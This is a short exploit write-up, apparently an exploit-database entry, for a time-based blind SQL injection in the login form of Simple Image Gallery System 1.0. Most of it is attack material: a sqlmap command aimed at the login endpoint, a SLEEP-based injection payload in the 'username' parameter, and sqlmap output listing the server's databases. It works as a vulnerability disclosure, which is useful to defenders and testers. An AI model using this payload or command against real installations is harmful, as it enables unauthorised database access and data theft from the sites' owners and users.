# Simple Image Gallery System 1.0 - SQL Injection (Time-Based)

###### Author: M3n0sD0n4ld
###### Twitter: [@David_Uton](https://twitter.com/David_Uton)

# Description:
The Simple Image Gallery System 1.0 application is vulnerable to SQL injection through the "username" parameter in the authentication form.

# Proof of Concept:

![Screenshot](1.png)

``` bash
sqlmap -u "http://[IP/HOST]:PORT/gallery/classes/Login.php?f=login" --data "username=admin&password=123456" --dbs --batch
```
### Exploiting
``` TEXT
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6178 FROM (SELECT(SLEEP(5)))VfMt) AND 'YJYU'='YJYU&password=123456
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[INFO] fetching database names
[INFO] fetching number of databases
[INFO] resumed: 2
[INFO] resumed: gallery_db
[INFO] resumed: information_schema
available databases [2]:
[*] gallery_db
[*] information_schema
```
